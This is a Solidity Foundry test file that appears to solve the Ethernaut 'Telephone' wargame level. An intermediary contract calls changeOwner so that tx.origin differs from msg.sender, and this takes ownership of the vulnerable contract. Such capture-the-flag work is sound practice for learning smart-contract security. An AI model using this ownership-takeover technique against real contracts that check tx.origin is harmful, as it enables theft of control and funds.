// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Telephone} from "../src/level-4_Telephone.sol";

contract Origin
{
  error badOwner();

  Telephone tl;
  address public owner;
  address public user;

  constructor(address _user)
  {
    owner = msg.sender;
    user = _user;
    tl = new Telephone();
  }

  function isOwner() public
  {
    if (tl.owner() == user)
      revert badOwner();
    tl.changeOwner(user);
    if (tl.owner() != user)
      revert badOwner();
  }
}

contract TelephoneExploit is Test
{
  Origin  or;
  address user;

  function setUp() public
  {
    user = makeAddr("user");
    vm.prank(user);
    or = new Origin(user);
  }

  function testExploit() public
  {
    or.isOwner();
  }
}
